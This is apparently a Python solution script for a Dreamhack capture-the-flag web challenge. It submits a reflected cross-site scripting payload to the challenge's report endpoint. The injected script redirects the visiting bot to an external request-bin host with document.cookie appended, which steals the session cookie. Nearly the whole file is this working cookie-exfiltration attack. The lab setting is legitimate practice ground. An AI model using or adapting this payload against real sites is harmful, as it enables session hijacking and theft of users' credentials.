import requests

URL = "http://host3.dreamhack.games:15353"
REQUEST_BIN = "https://d063ch2z1wg0000hw6vggodbsewyyyyyb.oast.pro/"
PROB_URI = "/report"
FLAG_URI = "/whoami"

PAYLOAD = f"/intro?name=<script>location.href='{REQUEST_BIN}'%2Bdocument.cookie</script>&detail=aaa"

DATA = {'path': PAYLOAD}

resp = requests.post(url=URL+PROB_URI, data=DATA)

print(resp.text)
